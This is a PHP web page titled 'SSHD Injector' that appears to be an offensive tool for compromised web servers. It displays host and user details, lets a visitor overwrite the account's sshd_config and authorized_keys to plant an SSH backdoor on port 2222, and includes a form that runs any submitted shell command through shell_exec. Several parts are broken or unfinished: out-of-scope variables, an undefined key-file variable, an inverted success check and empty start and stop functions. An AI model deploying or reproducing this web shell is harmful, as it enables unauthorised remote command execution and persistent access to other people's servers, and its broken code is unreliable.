<!DOCTYPE html>
<!-- Alexis Giraudet -->
<?php

$sshd_bin = "sshd"; //line5
$ssh_keygen_bin = "ssh-keygen"; //line6

$home = getenv("HOME");
if($home === FALSE)
{
    $home = ".";
}

$path = getenv("PATH");
if($path === FALSE)
{
    $path = ".";
}

$ssh_path = $home."/.ssh";
$authorized_keys = $ssh_path."/authorized_keys";
$sshd_path = $home."/.ssh";
$sshd_config = $sshd_path."/sshd_config";
$sshd_hostkey = $sshd_path."/ssh_host_key";
$sshd_pidfile = $sshd_path."/sshd.pid";

$ssh_path_exist = @is_dir($ssh_path);
$authorized_keys_exist = @is_file($authorized_keys);
$sshd_path_exist = @is_dir($sshd_path);
$sshd_config_exist = @is_file($sshd_config);
$sshd_hostkey_exist = @is_file($sshd_hostkey);
$sshd_pidfile_exist = @is_file($sshd_pidfile);

$sshd_default_config_content = "Port 2222\nHostKey ".$sshd_hostkey."\nUsePrivilegeSeparation no\nPidFile ".$sshd_pidfile."\n";

function prepare_dir($dir)
{
    if(@is_dir($dir))
    {
        return TRUE;
    }
    return @mkdir($dir);
}

function prepare_ssh_dir()
{
    return prepare_dir($ssh_path);
}

function prepare_sshd_dir()
{
    return prepare_dir($sshd_path);
}

function start()
{
    ;
}

function stop()
{
    ;
}

function clear()
{
    ;
}

?>
<html>
    <head>
        <meta charset="utf-8" />
        <title>SSHD Injector</title>
    </head>
    <body>
        <p style="border-style: solid; border-width: medium;">
            <?php echo htmlentities(shell_exec("uname -a")); ?>
            <br>
            <?php echo htmlentities(shell_exec("id")); ?>
            <br>
            <?php echo htmlentities("HOME = ".$home); ?>
            <br>
            <?php echo htmlentities("PATH = ".$path); ?>
            <br>
            <?php echo htmlentities("sshd = ".$sshd_bin); ?>
            <br>
            <?php echo htmlentities("ssh-keygen = ".$ssh_keygen_bin); ?>
            <br>
            <table>
                <tr>
                    <td><?php echo htmlentities($ssh_path); ?></td>
                    <td><?php if($ssh_path_exist){ echo "O"; } else{ echo "X"; } ?></td>
                </tr>
                <tr>
                    <td><?php echo htmlentities($sshd_path); ?></td>
                    <td><?php if($sshd_path_exist){ echo "O"; } else{ echo "X"; } ?></td>
                </tr>
                <tr>
                    <td><?php echo htmlentities($authorized_keys); ?></td>
                    <td><?php if($authorized_keys_exist){ echo "O"; } else{ echo "X"; } ?></td>
                </tr>
                <tr>
                    <td><?php echo htmlentities($sshd_config); ?></td>
                    <td><?php if($sshd_config_exist){ echo "O"; } else{ echo "X"; } ?></td>
                </tr>
                <tr>
                    <td><?php echo htmlentities($sshd_hostkey); ?></td>
                    <td><?php if($sshd_hostkey_exist){ echo "O"; } else{ echo "X"; } ?></td>
                </tr>
                <tr>
                    <td><?php echo htmlentities($sshd_pidfile); ?></td>
                    <td><?php if($sshd_pidfile_exist){ echo "O"; } else{ echo "X"; } ?></td>
                </tr>
            </table>
        </p>
        <form method="post" action="<?php echo basename(__FILE__); ?>">
            <fieldset>
                <legend>Update sshd_config</legend>
<?php
                if(isset($_POST["sshd_config_content"]))
                {
                    echo "<p style=\"border-style: solid; border-width: medium;\">";
                    if((!prepare_sshd_dir()) || (file_put_contents($sshd_config, $_POST["sshd_config_content"])))
                    {
                        echo "Error";
                    }
                    else
                    {
                        echo "sshd-config updated";
                    }
                    echo "</p>";
                }
?>
                <textarea name="sshd_config_content" style="width:100%" required>
<?php
                    $sshd_config_content = @file_get_contents($sshd_config);
                    if($sshd_config_content === FALSE)
                    {
                        echo $sshd_default_config_content;
                    }
                    else
                    {
                        echo $sshd_config_content;
                    }
?>
                </textarea>
                <br />
                <input type="submit" value="Update sshd_config" />
            </fieldset>
        </form>
        <form method="post" action="<?php echo basename(__FILE__); ?>">
            <fieldset>
                <legend>Update authorized_keys</legend>
<?php
                if(isset($_POST["authorized_keys_content"]))
                {
                    echo "<p style=\"border-style: solid; border-width: medium;\">";
                    if((!prepare_ssh_dir()) || (file_put_contents($sshd_authorized_keys, $_POST["authorized_keys_content"])))
                    {
                        echo "Error";
                    }
                    else
                    {
                        echo "authorized-keys updated";
                    }
                    echo "</p>";
                }
?>
                <textarea name="authorized_keys_content" style="width:100%" required>
<?php
                    $sshd_authorized_keys_content = @file_get_contents($sshd_authorized_keys);
                    if($sshd_authorized_keys_content === FALSE)
                    {
                        ;
                    }
                    else
                    {
                        echo $sshd_authorized_keys_content;
                    }
?>
                </textarea>
                <br />
                <input type="submit" value="Update authorized_keys" />
            </fieldset>
        </form>
        <form method="post" action="<?php echo basename(__FILE__); ?>">
            <fieldset>
                <legend>Execute command</legend>
<?php
                if(isset($_POST["command"]))
                {
                    echo "<p style=\"border-style: solid; border-width: medium;\">";
                    echo htmlentities("$".$_POST["command"])."<br>";
                    echo nl2br(htmlentities(shell_exec($_POST["command"])));
                    echo "</p>";
                }
?>
                <input type="text" name="command" value="find `echo $PATH | tr ':'' ' '` -name 'sshd' 2> /dev/null" style="width:100%">
                <br />
                <input type="submit" value="Execute" />
            </fieldset>
        </form>
    </body>
</html>
